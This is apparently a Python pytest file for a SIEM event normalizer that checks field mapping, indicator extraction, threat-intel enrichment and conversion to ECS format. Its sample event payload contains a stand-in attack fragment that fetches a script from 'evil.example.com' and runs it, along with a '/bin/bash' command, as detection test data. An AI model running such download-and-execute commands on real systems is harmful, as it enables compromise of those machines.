"""Faz 32 - SIEM normalizasyon & zenginlestirme testleri."""
from arachne.siem import normalizer


def _sample_event():
    return {
        "source_ip": "203.0.113.9",
        "source_port": 51234,
        "service": "ssh",
        "dest_port": 2222,
        "event_type": "login_attempt",
        "timestamp": "2026-08-15T12:00:00Z",
        "payload": (
            "user=admin login failed; "
            "wget http://evil.example.com/x.sh and run; "
            "cmd=/bin/bash; host=victim01; "
            "hash 5d41402abc4b2a76b9719d911017c592"
        ),
    }


# --- normalize_event -------------------------------------------------------

def test_normalize_basic_fields():
    n = normalizer.normalize_event(_sample_event())
    assert n["src_ip"] == "203.0.113.9"
    assert n["src_port"] == 51234
    assert n["dst_service"] == "ssh"
    assert n["dst_port"] == 2222
    assert n["event_type"] == "login_attempt"
    assert n["ts"] == "2026-08-15T12:00:00Z"


def test_normalize_extracts_entities():
    n = normalizer.normalize_event(_sample_event())
    ent = n["entities"]
    assert "203.0.113.9" in ent["ips"]
    assert "evil.example.com" in ent["domains"]
    assert "http://evil.example.com/x.sh" in ent["urls"]
    assert "5d41402abc4b2a76b9719d911017c592" in ent["hashes"]
    assert "admin" in ent["users"]
    assert "victim01" in ent["devices"]
    # cmd= degeri ve serbest metin surec adlari yakalanir
    assert any("bash" in p for p in ent["processes"])


def test_normalize_entity_keys_always_present():
    n = normalizer.normalize_event({"source_ip": "10.0.0.1", "payload": ""})
    for key in ("ips", "domains", "hashes", "urls", "users",
                "processes", "devices"):
        assert key in n["entities"]
        assert isinstance(n["entities"][key], list)


def test_normalize_injectable_extract_fn():
    called = {}

    def fake_extract(text):
        called["text"] = text
        return {"ipv4": ["1.1.1.1"], "domains": ["x.com"]}

    n = normalizer.normalize_event(
        {"source_ip": "9.9.9.9", "payload": "hi"}, extract_fn=fake_extract
    )
    assert called["text"] == "hi"
    assert "1.1.1.1" in n["entities"]["ips"]
    assert "x.com" in n["entities"]["domains"]


def test_normalize_ua_device_hint():
    ev = {"source_ip": "8.8.8.8",
          "payload": "GET / Mozilla/5.0 (Windows NT 10.0; Win64)"}
    n = normalizer.normalize_event(ev)
    assert "Windows NT" in n["entities"]["devices"]


# --- enrich_event ----------------------------------------------------------

def test_enrich_counts_and_scope():
    n = normalizer.normalize_event(_sample_event())
    e = normalizer.enrich_event(n)
    enr = e["enrichment"]
    assert enr["ioc_count"] >= 4
    assert enr["scope"] == "documentation"   # 203.0.113.0/24 -> RFC 5737
    assert "malware-hash" in enr["tags"]


def test_enrich_known_bad_hit():
    n = normalizer.normalize_event(_sample_event())
    e = normalizer.enrich_event(n, known_bad={"evil.example.com"})
    assert e["enrichment"]["known_bad_hit"] is True


def test_enrich_no_known_bad_hit():
    n = normalizer.normalize_event(_sample_event())
    e = normalizer.enrich_event(n, known_bad={"safe.example.org"})
    assert e["enrichment"]["known_bad_hit"] is False


def test_enrich_scope_loopback_and_private():
    loop = normalizer.enrich_event(
        normalizer.normalize_event({"source_ip": "127.0.0.1", "payload": ""}))
    priv = normalizer.enrich_event(
        normalizer.normalize_event({"source_ip": "10.1.2.3", "payload": ""}))
    assert loop["enrichment"]["scope"] == "loopback"
    assert priv["enrichment"]["scope"] == "private"


# --- to_ecs ----------------------------------------------------------------

def test_to_ecs_mapping():
    n = normalizer.normalize_event(_sample_event())
    ecs = normalizer.to_ecs(n)
    assert ecs["@timestamp"] == "2026-08-15T12:00:00Z"
    assert ecs["source"]["ip"] == "203.0.113.9"
    assert ecs["source"]["port"] == 51234
    assert ecs["destination"]["port"] == 2222
    assert ecs["destination"]["service"] == "ssh"
    assert ecs["event"]["category"] == "authentication"   # login -> auth
    assert ecs["event"]["type"] == "login_attempt"
    assert "203.0.113.9" in ecs["related"]["ip"]
    assert "admin" in ecs["related"]["user"]
    assert "5d41402abc4b2a76b9719d911017c592" in ecs["related"]["hash"]


# --- normalize_batch -------------------------------------------------------

def test_normalize_batch():
    events = [_sample_event(), {"source_ip": "10.0.0.2", "payload": ""}]
    out = normalizer.normalize_batch(events)
    assert len(out) == 2
    assert out[0]["src_ip"] == "203.0.113.9"
    assert out[1]["src_ip"] == "10.0.0.2"
    assert normalizer.normalize_batch([]) == []
